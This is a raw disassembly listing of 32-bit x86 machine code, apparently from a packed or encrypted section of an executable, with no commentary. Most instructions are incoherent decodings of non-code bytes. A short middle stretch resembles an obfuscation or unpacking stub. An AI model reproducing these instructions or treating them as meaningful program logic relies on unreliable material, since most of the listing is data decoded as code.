  409aa1:	jb     0x409ad9
  409aa3:	stos   DWORD PTR es:[edi],eax
  409aa4:	pop    ecx
  409aa5:	jb     0x409aee
  409aa7:	aaa    
  409aa8:	xor    al,0xfa
  409aaa:	sbb    DWORD PTR [ebp+edx*2-0x6b],eax
  409aae:	add    al,0xeb
  409ab0:	je     0x409a65
  409ab2:	jmp    0x1546:0x7a4c1928
  409ab9:	add    al,0xc4
  409abb:	jnp    0x409ad8
  409abd:	dec    edx
  409abe:	push   edx
  409abf:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  409ac1:	hlt    
  409ac2:	sbb    BYTE PTR [ebx-0x55a25295],dh
  409ac8:	mov    al,0x3e
  409aca:	cmp    al,0x8a
  409acc:	lods   eax,DWORD PTR ds:[esi]
  409acd:	jno    0x409b40
  409acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ad0:	jmp    0xe63e338d
  409ad5:	test   DWORD PTR [esi],esp
  409ad7:	jp     0x409b22
  409ad9:	test   al,0x7b
  409adb:	mov    DWORD PTR [ecx],eax
  409add:	(bad)  
  409ade:	(bad)  
  409adf:	cli    
  409ae0:	push   es
  409ae1:	ins    BYTE PTR es:[edi],dx
  409ae2:	bound  ebx,QWORD PTR [eax]
  409ae4:	cmp    al,0xa2
  409ae6:	push   es
  409ae7:	leave  
  409ae8:	iret   
  409ae9:	inc    esi
  409aea:	sub    DWORD PTR [esi],ecx
  409aec:	sti    
  409aed:	pop    ebx
  409aee:	push   ss
  409aef:	inc    ecx
  409af0:	add    bl,BYTE PTR [ebx-0x1fc306a9]
  409af6:	push   ss
  409af7:	outs   dx,BYTE PTR ds:[esi]
  409af8:	fstp   TBYTE PTR [ebx]
  409afa:	push   ebp
  409afb:	ret    
  409afc:	add    ebp,ebp
  409afe:	pop    eax
  409aff:	xor    BYTE PTR [edi],al
  409b01:	xor    eax,0xac85f761
  409b06:	adc    DWORD PTR [ebx+0x6794e11d],ecx
  409b0c:	(bad)  
  409b0d:	jge    0x409b2e
  409b0f:	dec    esp
  409b10:	(bad)
  409b13:	stc    
  409b14:	xor    bh,ah
  409b16:	mul    BYTE PTR [ebp-0x7]
  409b19:	xor    BYTE PTR [ecx+0x271a907f],dh
  409b1f:	mov    edi,DWORD PTR [eax]
  409b21:	jns    0x409aac
  409b23:	push   0xa40258b2
  409b28:	pusha  
  409b29:	xchg   edi,eax
  409b2a:	test   BYTE PTR [edx+0x77],bl
  409b2d:	add    ebp,edx
  409b2f:	in     al,0xea
  409b31:	scas   eax,DWORD PTR es:[edi]
  409b32:	add    dh,BYTE PTR [edi-0x101b52dd]
  409b38:	popf   
  409b39:	xchg   esi,eax
  409b3a:	(bad)  
  409b3b:	ja     0x409b13
  409b3d:	pop    esi
  409b3e:	add    dh,BYTE PTR [ebx+0x75145da7]
  409b44:	mov    ah,0x2
  409b46:	aaa    
  409b47:	out    0xf5,al
  409b49:	inc    ecx
  409b4a:	sar    BYTE PTR [ecx+0x1ca1938e],1
  409b50:	dec    ecx
  409b51:	dec    eax
  409b52:	repnz loop 0x409b41
  409b55:	pop    ebp
  409b56:	rcl    BYTE PTR [esp+eiz*2],0xe3
  409b5a:	test   al,0xa4
  409b5c:	jmp    0x67879b3e
  409b61:	in     eax,dx
  409b62:	mov    bl,0x97
  409b64:	aam    0x46
  409b66:	rol    DWORD PTR [esi],cl
  409b68:	mov    esi,0x4589c5a9
  409b6d:	shr    BYTE PTR [ecx],0x15
  409b70:	add    eax,DWORD PTR [ebp+0x43]
  409b73:	add    BYTE PTR [eax+0x7510851],bh
  409b79:	mov    edi,DWORD PTR ds:0x43445f
  409b7f:	or     DWORD PTR ds:0x4344cf,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x4344ff
  409b8f:	xor    DWORD PTR ds:0x434503,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x4344eb
  409bb7:	mov    edi,DWORD PTR ds:0x4345a3
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	pop    ds
  409bd4:	iret   
  409bd5:	test   BYTE PTR [esi+ecx*4-0x16],dh
  409bd9:	jle    0x409c59
  409bdb:	jo     0x409c56
  409bdd:	jle    0x409c5d
  409bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409be0:	push   edx
  409be1:	sbb    ch,BYTE PTR ds:0xd0b2463a
  409be7:	xchg   esi,eax
  409be8:	in     al,0x80
  409bea:	mov    esp,0xd59096d7
  409bef:	xor    al,0x5c
  409bf1:	jmp    0x409c3e
  409bf3:	hlt    
  409bf4:	push   esi
  409bf5:	add    eax,0xbc47831a
  409bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bfb:	pop    ebx
  409bfc:	xchg   ebp,eax
  409bfd:	lds    ebp,FWORD PTR [eax-0x58]
  409c00:	in     eax,0x5a
  409c02:	and    al,0x64
  409c04:	(bad)  
  409c05:	sub    BYTE PTR [ebp-0x1b],ah
  409c08:	icebp  
  409c09:	mov    al,0x85
  409c0b:	inc    ebp
  409c0c:	mov    edx,DWORD PTR [ebx+0x76]
  409c0f:	mov    eax,0x59224fa9
  409c14:	sub    dl,BYTE PTR [edx+0x3fe7c55e]
  409c1a:	enter  0xc971,0xf9
  409c1e:	loopne 0x409c89
  409c20:	inc    ecx
  409c21:	mov    esp,0xc2191be9
  409c26:	adc    BYTE PTR [eax*1+0x38ef4ec3],bh
  409c2d:	cdq    
  409c2e:	in     eax,0x8c
  409c30:	or     BYTE PTR [edi],ah
  409c32:	fnstenv [ebp-0x79be903f]
  409c38:	pop    ecx
  409c39:	jle    0x409c77
  409c3b:	mov    al,cs:0x2f9c50d3
  409c41:	push   0x141228fb
  409c46:	and    al,0x44
  409c48:	ja     0x409c1a
  409c4a:	mov    esp,0x4be229c4
  409c4f:	arpl   WORD PTR [esi+0x5c055a4],dx
  409c55:	push   es
  409c56:	call   0x265a:0x3665d537
  409c5d:	mov    edi,0x756a7c68
  409c62:	mov    ds:0xe5d28a85,al
  409c67:	imul   esp,DWORD PTR [eax+0x65],0x6e
  409c6b:	iret   
  409c6c:	add    ebx,DWORD PTR [esi-0x34a9ae32]
  409c72:	pop    es
  409c73:	xchg   ecx,eax
  409c74:	or     BYTE PTR [esp+eax*8],ch
  409c77:	push   esi
  409c78:	test   DWORD PTR [edx],ecx
  409c7a:	push   ebp
  409c7b:	mov    bl,0x9e
  409c7d:	add    dh,BYTE PTR [edi+0x5418c567]
  409c83:	ins    DWORD PTR es:[edi],dx
  409c84:	int3   
  409c85:	jb     0x409d01
  409c87:	and    BYTE PTR [ebp-0x32b9d08b],dl
  409c8d:	lods   al,BYTE PTR ds:[esi]
  409c8e:	dec    ebx
  409c8f:	fcomi  st,st(7)
  409c91:	mov    edx,0x7c40debf
  409c96:	mov    ebx,DWORD PTR [eax]
  409c98:	add    ecx,DWORD PTR [edi+edx*8]
  409c9b:	mov    bh,ah
  409c9d:	mov    edx,edi
  409c9f:	adc    edi,ebp
  409ca1:	sbb    BYTE PTR [esi],0x13
  409ca4:	jns    0x409d22
  409ca6:	and    esi,edi
  409ca8:	cmp    cl,BYTE PTR [ecx]
  409caa:	out    0xea,al
  409cac:	cmp    eax,0x23bd5146
  409cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb2:	push   0x92147366
  409cb7:	lods   eax,DWORD PTR ds:[esi]
  409cb8:	adc    ch,bl
  409cba:	ds cdq 
  409cbc:	pop    edi
  409cbd:	loopne 0x409c74
  409cbf:	mov    bh,0xe8
  409cc1:	jp     0x409c7a
  409cc3:	or     edi,esi
  409cc5:	lds    edx,FWORD PTR [ebx-0x6f9c48af]
  409ccb:	sti    
  409ccc:	add    al,0xa8
  409cce:	jecxz  0x409c6f
  409cd0:	xchg   ebp,eax
  409cd1:	jge    0x409c8a
  409cd3:	mov    dh,0xea
  409cd5:	jle    0x409c8c
  409cd7:	fsub   DWORD PTR [edx]
  409cd9:	int3   
  409cda:	call   0xadcf1933
  409cdf:	dec    ecx
  409ce0:	pop    esp
  409ce1:	push   ebx
  409ce2:	cmp    al,0x65
  409ce4:	data16 jge 0x409d17
  409ce7:	xor    cl,ch
  409ce9:	push   esi
  409cea:	push   ecx
  409ceb:	sar    BYTE PTR [edx],0xae
  409cee:	cmp    BYTE PTR [edx-0x18],ch
  409cf1:	sti    
  409cf2:	xor    al,0xbd
  409cf4:	or     al,0xa0
  409cf6:	mov    DWORD PTR [edi],ecx
  409cf8:	(bad)  [edx]
  409cfa:	mov    al,0x3f
  409cfc:	cld    
  409cfd:	jecxz  0x409d50
  409cff:	inc    ecx
  409d00:	sub    DWORD PTR [ebx-0x66],0xffffffab
  409d04:	sub    BYTE PTR [eax],bh
  409d06:	sub    dh,BYTE PTR [esi+ecx*8]
  409d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d0a:	add    cl,BYTE PTR [edi-0x4b]
  409d0d:	cmp    BYTE PTR [edi+0x5a3b2178],cl
  409d13:	mov    al,ds:0xbacf2dbe
  409d18:	(bad)  ds:0xe8a0632a
  409d1e:	cmp    al,0x14
  409d20:	sbb    edi,DWORD PTR [ecx+edi*4+0x12]
  409d24:	pop    esi
  409d25:	cmp    BYTE PTR [ebx-0x1d],0x41
  409d29:	mov    DWORD PTR [ecx-0x54],edx
  409d2c:	pop    eax
  409d2d:	push   ebx
  409d2e:	push   ss
  409d2f:	jae    0x409d90
  409d31:	repnz ins BYTE PTR es:[edi],dx
  409d33:	mov    cl,0xa2
  409d36:	(bad)
  409d39:	cmp    BYTE PTR [ecx+0x78],0x49
  409d3d:	xor    ch,BYTE PTR [ecx-0xfe42c52]
  409d43:	stos   DWORD PTR es:[edi],eax
  409d44:	push   ebp
  409d45:	ins    DWORD PTR es:[edi],dx
  409d46:	mov    esi,0x29e3fe8f
  409d4b:	pop    ss
  409d4c:	or     DWORD PTR [edx],eax
  409d4e:	mov    ebx,0x6a8cdd04
  409d53:	int    0x45
  409d55:	push   cs
  409d56:	mov    ch,0x6c
  409d58:	popa   
  409d59:	mov    dh,0x35
  409d5b:	out    0x6a,eax
  409d5d:	cld    
  409d5e:	xchg   DWORD PTR [ebx],esp
  409d60:	cmp    dh,dl
  409d62:	popa   
  409d63:	sbb    BYTE PTR [ebp-0x12],bl
  409d66:	xchg   BYTE PTR [eax+edx*2],bl
  409d69:	mov    edi,DWORD PTR [esi-0x6]
  409d6c:	nop
  409d6d:	cs inc ecx
  409d6f:	or     BYTE PTR [edx-0x6],bh
  409d72:	jno    0x409cf8
  409d74:	add    edi,0x64de13c7
  409d7a:	xchg   DWORD PTR [ebx-0x150dcb7b],edi
  409d80:	retf   0x884e
  409d83:	xchg   ebp,eax
  409d84:	adc    al,ch
  409d86:	ja     0x409d12
  409d88:	mov    bl,0x50
  409d8a:	or     eax,DWORD PTR [ebp+ebp*1-0x2d]
  409d8e:	and    al,dh
  409d90:	mov    ds:0x58a293be,eax
  409d95:	add    eax,0x4e945090
  409d9a:	xchg   esi,eax
  409d9b:	dec    eax
  409d9c:	mov    ecx,0xc5c0105b
  409da1:	fistp  QWORD PTR [ecx-0x1f]
  409da4:	pop    esi
  409da5:	jae    0xb0be893e
  409dab:	mov    ebp,0x6a127a18
  409db0:	push   esp
  409db1:	pop    esi
  409db2:	or     eax,edx
  409db4:	pop    edx
  409db5:	cmp    DWORD PTR [edx+0x8],ecx
  409db8:	ss iret 
  409dba:	(bad)  
  409dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dbc:	cmp    al,0x16
  409dbe:	sbb    DWORD PTR [ebp-0x5a],esp
  409dc1:	mov    eax,0x9480a05c
  409dc6:	test   DWORD PTR [si-0x52],ecx
  409dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcb:	mov    ebx,0x41c4c7f0
  409dd0:	test   DWORD PTR [ecx+edx*2-0x6e],ecx
  409dd4:	stc    
  409dd5:	lahf   
  409dd6:	sub    DWORD PTR [eax],eax
  409dd8:	daa    
  409dd9:	dec    ebp
  409dda:	cmp    dl,BYTE PTR [edx]
  409ddc:	gs out 0x34,eax
  409ddf:	ret    
  409de0:	mov    BYTE PTR [ebp-0x69e78e8],ah
  409de6:	cmp    ah,BYTE PTR [ecx]
  409de8:	scas   al,BYTE PTR es:[edi]
  409de9:	ja     0x409d87
  409deb:	push   0x502722c9
  409df0:	sbb    edi,edx
  409df2:	std    
  409df3:	call   0x5ebc:0x1eb7a806
  409dfa:	mov    ebx,0xef8ce5d
  409dff:	popa   
  409e00:	mov    dh,0x2d
  409e02:	xor    BYTE PTR [edx],bh
  409e04:	push   esi
  409e05:	xor    DWORD PTR [esi],esi
  409e07:	mov    al,ds:0xfde862f
  409e0c:	(bad)  
  409e0d:	mov    ecx,0xee5bf083
  409e12:	mov    bh,0xc1
  409e14:	xor    BYTE PTR [esi-0x1b],ch
  409e17:	pop    ebx
  409e18:	mov    DWORD PTR [ecx-0x6e],0xd095e77f
  409e1f:	call   0xff16:0x8338e951
  409e26:	push   ss
  409e27:	cli    
  409e28:	xor    BYTE PTR [eax+0x62],al
  409e2b:	fisub  WORD PTR ds:0xfa2339c9
  409e31:	inc    ebx
  409e32:	enter  0x865b,0xe5
  409e36:	pop    ss
  409e37:	out    0xde,al
  409e39:	call   0xb8e4:0x8317dc5c
  409e40:	xor    cl,BYTE PTR [edx]
  409e42:	inc    ebp
  409e43:	push   ecx
  409e44:	xchg   ecx,ecx
  409e46:	cmp    dl,dh
  409e48:	idiv   BYTE PTR [edx]
  409e4a:	fild   WORD PTR [edi+edx*4]
  409e4d:	stos   DWORD PTR es:[edi],eax
  409e4e:	sbb    dl,ch
  409e50:	hlt    
  409e51:	inc    ebx
  409e52:	xor    ebx,ecx
  409e54:	(bad)  
  409e55:	dec    ebp
  409e56:	jle    0x409dde
  409e58:	fnsave [edx+eiz*1-0x53]
  409e5c:	shr    ebx,0x27
  409e5f:	pop    ecx
  409e60:	shr    edx,cl
  409e62:	fld    QWORD PTR [ebx]
  409e64:	mov    dh,0x5a
  409e66:	pop    esi
  409e67:	aad    0xe9
  409e69:	adc    eax,0xc43eee49
  409e6e:	bswap  eax
  409e70:	mov    ebx,ebx
  409e72:	and    eax,0x1eac80d5
  409e77:	test   eax,0x3065fa84
  409e7c:	mov    esi,0xe8d5fc73
  409e81:	jno    0x409ee1
  409e83:	jp     0x409e0a
  409e85:	hlt    
  409e86:	inc    ebp
  409e87:	sub    al,0x96
  409e89:	out    0xe0,al
  409e8b:	cwde   
  409e8c:	loop   0x409eba
  409e8e:	mov    eax,0x589a4fd6
  409e93:	das    
  409e94:	(bad)  
  409e96:	add    edx,DWORD PTR [edi-0x6a]
  409e99:	cmp    ch,0xd0
  409e9c:	push   cs
  409e9d:	ret    0xe5fa
  409ea0:	test   eax,0x6a1095c2
  409ea5:	aad    0xa4
  409ea7:	pop    esp
  409ea8:	jmp    0x9547ce2e
  409ead:	mov    ah,BYTE PTR [edx-0x7b052c2b]
  409eb3:	sbb    al,0xe1
  409eb5:	mov    al,0xcd
  409eb7:	outs   dx,DWORD PTR ds:[esi]
  409eb8:	pop    ebp
  409eb9:	xor    al,0x41
  409ebb:	sub    al,0xe
  409ebd:	xor    eax,0x4dc503d4
  409ec2:	and    ecx,DWORD PTR [eax+0x339738dd]
  409ec8:	fcmovnb st,st(4)
  409eca:	and    DWORD PTR ds:0xa55982f9,0x57f06ed2
  409ed4:	and    al,0xf3
  409ed6:	test   eax,0xc8c3babd
  409edb:	xor    eax,0x4da2e6ae
  409ee0:	mov    ecx,0x28013332
  409ee5:	jns    0x409e91
  409ee7:	(bad)  
  409ee8:	jp     0x409f67
  409eea:	out    0xd9,al
  409eec:	jl     0x409ee6
  409eee:	xor    DWORD PTR cs:[eax+edx*1],edi
  409ef2:	and    eax,0xd8dde2ca
  409ef7:	pop    esi
  409ef8:	push   edx
  409ef9:	ret    0x4123
  409efc:	sub    eax,ebp
  409efe:	dec    esi
  409eff:	sub    eax,0x85a4e35a
  409f04:	dec    ebp
  409f05:	sub    eax,DWORD PTR [esi-0x1a]
  409f08:	jo     0x409ebf
  409f0a:	aaa    
  409f0b:	dec    ecx
  409f0c:	cmc    
  409f0d:	in     al,0x7b
  409f0f:	in     eax,dx
  409f10:	mov    edi,0xeeccede9
  409f15:	mov    gs,ecx
  409f17:	dec    edx
  409f18:	cdq    
  409f19:	loopne 0x409f48
  409f1b:	mov    al,0x82
  409f1d:	mov    al,0xe4
  409f1f:	mov    dh,0x9e
  409f21:	mov    DWORD PTR [ecx+0x5bcce8df],eax
  409f27:	mov    edx,0x1b5f8665
  409f2c:	xchg   edi,eax
  409f2d:	and    edx,ebp
  409f2f:	loop   0x409f0e
  409f31:	mov    al,ds:0x7794d80
  409f36:	jmp    0x409f16
  409f38:	mov    ecx,0x23efc6ec
  409f3d:	in     al,0xc
  409f3f:	lods   eax,DWORD PTR ds:[esi]
  409f40:	test   eax,0x133dcb07
  409f45:	pop    ss
  409f46:	mov    bl,0xde
  409f48:	sbb    eax,0x4ee17899
  409f4d:	jmp    0x409f6b
  409f4f:	and    bh,BYTE PTR [eax]
  409f51:	xchg   ebx,eax
  409f52:	imul   edi,DWORD PTR [edi],0xffffffdb
  409f55:	xor    eax,0xa6cb8e5d
  409f5a:	xchg   edi,eax
  409f5b:	jo     0x409f13
  409f5d:	pop    ebx
  409f5e:	(bad)
  409f62:	cmp    al,0xb1
  409f64:	vmread DWORD PTR [ecx],ecx
  409f67:	xor    eax,0xc15cd5fe
  409f6c:	call   0xead1e4ad
  409f71:	add    ecx,ebp
  409f73:	(bad)  [edi+0x10]
  409f76:	rol    BYTE PTR [ebx+0x13e945d3],1
  409f7c:	sbb    eax,0x9b121ddd
  409f81:	aas    
  409f82:	and    eax,0x525ff21b
  409f87:	dec    ebp
  409f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f89:	mov    bh,0xbc
  409f8b:	xchg   DWORD PTR [ebx],edi
  409f8d:	mov    eax,gs:0xb38e25bc
  409f93:	outs   dx,BYTE PTR ds:[esi]
  409f94:	in     al,dx
  409f95:	loopne 0x409ffd
  409f97:	icebp  
  409f98:	adc    eax,0xc188fb
  409f9d:	dec    ecx
  409f9e:	in     eax,dx
  409f9f:	stos   DWORD PTR es:[edi],eax
  409fa0:	and    BYTE PTR [eax],dh
  409fa2:	add    ebx,DWORD PTR [edx]
  409fa4:	sbb    esp,DWORD PTR [edi-0x76]
  409fa7:	je     0x409f2c
  409fa9:	out    0x4e,eax
  409fab:	std    
  409fac:	popa   
  409fad:	scas   al,BYTE PTR es:[edi]
  409fae:	fs mov ecx,0xb48575c4
  409fb4:	xchg   DWORD PTR [ebp-0x7cf48260],ebx
  409fba:	jp     0x40a007
  409fbc:	inc    esi
  409fbd:	icebp  
  409fbe:	jnp    0x409f8e
  409fc0:	sub    eax,0xbee193d5
  409fc5:	lea    esi,[ecx-0x1c]
  409fc8:	(bad)  
  409fc9:	aad    0xc3
  409fcb:	(bad)  
  409fcc:	xchg   edx,eax
  409fcd:	mul    DWORD PTR [ecx+0x5eb4cf11]
  409fd3:	jo     0x409f74
  409fd5:	retf   0xff07
  409fd8:	pop    ebp
  409fd9:	mov    DWORD PTR [ebp-0x28],0xf89c8538
  409fe0:	and    edi,edi
  409fe2:	jmp    0x40a3f9
  409fe7:	popa   
  409fe8:	imul   ebp,esp,0xffffff8d
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fldcw  WORD PTR [ecx+0x11]
  409ff5:	sbb    ebx,ebp
  409ff7:	xor    dh,0x7e
  409ffa:	jle    0x40a06c
  409ffc:	jns    0x40a07c
  409ffe:	jle    0x409fee
  40a000:	mov    dh,0x80
  40a002:	ret    
  40a003:	cli    
  40a004:	and    ecx,edi
  40a006:	in     al,0x83
  40a008:	sub    BYTE PTR [eax],bh
  40a00a:	lods   eax,DWORD PTR ds:[esi]
  40a00b:	push   es
  40a00c:	das    
  40a00d:	retf   
  40a00e:	mov    bl,0xd5
  40a010:	mov    edx,0x89e6a49a
  40a015:	mov    edx,0x925d1ada
  40a01a:	add    eax,ecx
  40a01c:	jle    0x409fc0
  40a01e:	xor    dh,BYTE PTR [ebp+0x33]
  40a021:	stos   BYTE PTR es:[edi],al
  40a022:	and    eax,0x42f3ab9c
  40a027:	inc    eax
  40a028:	ins    DWORD PTR es:[edi],dx
  40a029:	jb     0x40a07e
  40a02b:	or     ebx,esi
  40a02d:	shl    DWORD PTR [esi+esi*1-0x15],0xa9
  40a032:	dec    edx
  40a033:	add    DWORD PTR [ebp+ebx*2+0x5e],esp
  40a037:	je     0x40a091
  40a039:	fs dec edx
  40a03b:	retf   0x58a1
  40a03e:	ficomp DWORD PTR [ebp+0x3d]
  40a041:	and    al,0xa7
  40a043:	call   0x976ef415
  40a048:	sti    
  40a049:	cwde   
  40a04a:	pop    ebp
  40a04b:	mov    BYTE PTR [ecx-0x6b],bh
  40a04e:	pusha  
  40a04f:	mov    eax,ss:0xdb76f2fe
  40a055:	hlt    
  40a056:	sbb    eax,0xf3ae3cbf
  40a05b:	or     eax,0x9fdaf5f6
  40a060:	bnd jp 0x40a0a4
  40a063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a064:	sbb    bl,al
  40a066:	xchg   edx,eax
  40a067:	js     0x40a0b0
  40a069:	xchg   edi,eax
  40a06a:	sub    al,0x4b
  40a06c:	cmp    DWORD PTR [ebp+0x13f7b3f0],0x6dfcd281
  40a076:	ds sti 
  40a078:	and    DWORD PTR [eax+0x1d],ebx
  40a07b:	pop    eax
  40a07c:	mov    bl,0xb6
  40a07e:	pusha  
  40a07f:	lds    esp,FWORD PTR [edi+eiz*8-0x33178d78]
  40a086:	repnz mov dl,0xf4
  40a089:	ret    0x3553
  40a08c:	pop    eax
  40a08d:	cmp    DWORD PTR ds:[edx+0x56],0xffffff87
  40a092:	mov    edi,0x4d49067c
  40a097:	mov    cl,0xbe
  40a099:	cmp    bh,BYTE PTR ds:0x334a1595
  40a09f:	push   ss
  40a0a0:	lahf   
  40a0a1:	data16 test al,0x15
  40a0a4:	pop    ss
  40a0a5:	cmp    esi,DWORD PTR [edi-0x2c27efea]
  40a0ab:	xchg   edi,eax
  40a0ac:	mov    WORD PTR [ebx+0x6d],ds
  40a0af:	push   ebp
  40a0b0:	ds push cs
  40a0b2:	das    
  40a0b3:	cs jl  0x40a093
  40a0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0b7:	fistp  DWORD PTR [edx-0x2e]
  40a0ba:	and    eax,0x3d7146dd
  40a0bf:	adc    edi,ebx
  40a0c1:	mov    DWORD PTR ds:0x72489350,0x4313fa3a
  40a0cb:	(bad)  
  40a0cc:	xchg   edi,eax
  40a0cd:	pushf  
  40a0ce:	nop
  40a0cf:	lods   al,BYTE PTR ds:[esi]
  40a0d0:	xor    esp,edx
  40a0d2:	add    al,bh
  40a0d4:	call   0x8b84de8a
  40a0d9:	inc    ebp
  40a0da:	dec    ecx
  40a0db:	aaa    
  40a0dc:	and    DWORD PTR [ebx+0x75abcebf],0x63
  40a0e3:	xchg   ecx,eax
  40a0e4:	jmp    0x8ff7:0xd5d39a5e
  40a0eb:	pusha  
  40a0ec:	scas   al,BYTE PTR es:[edi]
  40a0ed:	data16 lock cs test al,0xb7
  40a0f2:	dec    esi
  40a0f3:	adc    DWORD PTR [ebx+0x1c],ebp
  40a0f6:	test   al,0x31
  40a0f8:	sub    ch,BYTE PTR [edi]
  40a0fa:	jne    0x40a0c6
  40a0fc:	test   al,0x3e
  40a0fe:	xor    eax,0xc389ff2c
  40a103:	inc    eax
  40a104:	mov    dl,0x78
  40a106:	sub    DWORD PTR [edx+0x2c],eax
  40a109:	xor    al,0x36
  40a10b:	shl    DWORD PTR [ecx-0x35a12056],1
  40a111:	mov    esp,0x81700ab7
  40a116:	add    edx,DWORD PTR cs:[eax-0x64]
  40a11a:	cwde   
  40a11b:	(bad)  
  40a11d:	into   
  40a11e:	adc    al,0x31
  40a120:	lods   al,BYTE PTR ds:[esi]
  40a121:	(bad)  
  40a122:	xchg   esp,eax
  40a123:	bound  edx,QWORD PTR [eax]
  40a125:	in     eax,dx
  40a126:	cs cli 
  40a128:	sub    al,0x5f
  40a12a:	out    0xea,eax
  40a12c:	pop    ss
  40a12d:	or     al,0x1f
  40a12f:	jno    0x40a0db
  40a131:	jl     0x40a0d9
  40a133:	push   es
  40a134:	clc    
  40a135:	jns    0x40a18b
  40a137:	inc    esi
  40a138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a139:	ins    BYTE PTR es:[edi],dx
  40a13a:	rcr    DWORD PTR [edx],1
  40a13c:	pop    esp
  40a13d:	data16 xor BYTE PTR [eax-0x31],ch
  40a141:	and    ebx,DWORD PTR [ebp+0x4e495825]
  40a147:	push   ebx
  40a148:	jmp    0xff18:0x9e6fd042
  40a14f:	rcl    esi,1
  40a151:	and    BYTE PTR [ebx],bl
  40a153:	xor    esi,DWORD PTR [eax+0x16]
  40a156:	mov    ebp,DWORD PTR ds:0x46267200
  40a15c:	add    al,0x14
  40a15e:	fsubr  QWORD PTR [edx]
  40a160:	mov    WORD PTR [eax],es
  40a162:	mov    dl,0x58
  40a164:	cli    
  40a165:	out    0xa4,al
  40a167:	loope  0x40a169
  40a169:	in     al,0x54
  40a16b:	push   es
  40a16c:	adc    eax,0xcf73431b
  40a171:	mov    edx,0x5c3a2656
  40a176:	sbb    al,0x7c
  40a178:	pop    edi
  40a179:	cmp    al,0x6e
  40a17b:	div    bl
  40a17d:	sub    al,0x7d
  40a17f:	jmp    0x40a1ad
  40a181:	xchg   esp,eax
  40a182:	pop    ds
  40a183:	outs   dx,BYTE PTR ds:[esi]
  40a184:	fstp   QWORD PTR [ebp-0x1a]
  40a187:	je     0x40a190
  40a189:	cmp    cl,BYTE PTR [ebx]
  40a18b:	adc    BYTE PTR [edi+0x6c99fe40],ah
  40a191:	add    cl,BYTE PTR ds:0xaeb61382
  40a197:	outs   dx,DWORD PTR ds:[esi]
  40a198:	push   ds
  40a199:	jle    0x40a149
  40a19b:	mov    esi,0x61a6de6f
  40a1a0:	cmp    bl,al
  40a1a2:	add    dh,BYTE PTR [edx-0x4b3c3fa]
  40a1a8:	jmp    0xba41:0xc2a8b817
  40a1af:	mov    ds:0x3fff9f89,eax
  40a1b4:	(bad)  [edi]
  40a1b6:	out    0x5a,al
  40a1b8:	sbb    BYTE PTR [edx-0x71b10c64],bl
  40a1be:	pop    esp
  40a1bf:	pop    edx
  40a1c0:	(bad)  
  40a1c2:	sub    bl,ch
  40a1c4:	jl     0x40a14d
  40a1c6:	(bad)  
  40a1c8:	les    ebx,FWORD PTR [ecx]
  40a1ca:	es and al,0x64
  40a1cd:	sbb    cl,ch
  40a1cf:	jmp    0x4d4d51f
  40a1d4:	pop    esp
  40a1d5:	gs nop
  40a1d7:	dec    ebp
  40a1d8:	push   ss
  40a1d9:	sub    eax,0x4e3eb242
  40a1de:	std    
  40a1df:	or     al,BYTE PTR [esi+0x222e9683]
  40a1e5:	and    al,0xd6
  40a1e7:	dec    esi
  40a1e8:	jl     0x40a201
  40a1ea:	js     0x40a25e
  40a1ec:	mov    edi,0x496942c
  40a1f1:	adc    al,0xf5
  40a1f3:	pop    esi
  40a1f4:	sbb    edx,edx
  40a1f6:	retf   0x5833
  40a1f9:	inc    ecx
  40a1fa:	loope  0x40a25a
  40a1fc:	jl     0x40a263
  40a1fe:	mov    bl,0xc4
  40a200:	sub    DWORD PTR [edx],esi
  40a202:	sub    al,0x49
  40a204:	mov    ebp,0x8ae8dc9a
  40a209:	xchg   BYTE PTR [ebp-0x2f],dh
  40a20c:	mov    al,ds:0x5307663a
  40a211:	int    0xff
  40a213:	outs   dx,DWORD PTR ss:[esi]
  40a215:	mov    gs,WORD PTR [ebp-0x59f28d0e]
  40a21b:	jmp    0x6394:0xd822126e
  40a222:	nop
  40a223:	mov    ebx,DWORD PTR [edi]
  40a225:	lar    ebx,WORD PTR [ebx+0x2f]
  40a229:	adc    ch,cl
  40a22b:	and    dh,BYTE PTR [eax+esi*4+0x44]
  40a22f:	and    dh,BYTE PTR ds:0x18d6e889
  40a235:	(bad)  
  40a236:	push   ss
  40a237:	in     al,0x9f
  40a239:	adc    BYTE PTR [ebp+0x52],bh
  40a23c:	repnz dec ecx
  40a23e:	aas    
  40a23f:	mul    BYTE PTR [eax]
  40a241:	and    eax,0x27855fb3
  40a246:	adc    dh,BYTE PTR [ebp-0x22e199c1]
  40a24c:	push   0x2164adef
  40a251:	push   cs
  40a252:	fmul   st,st(0)
  40a255:	aam    0x9c
  40a257:	test   DWORD PTR [edx],ecx
  40a259:	ss adc ebp,0x573e0629
  40a260:	lds    eax,FWORD PTR ds:0xfb51ca45
  40a266:	mov    ebx,0x179f6ee4
  40a26b:	mov    edx,0x6504970a
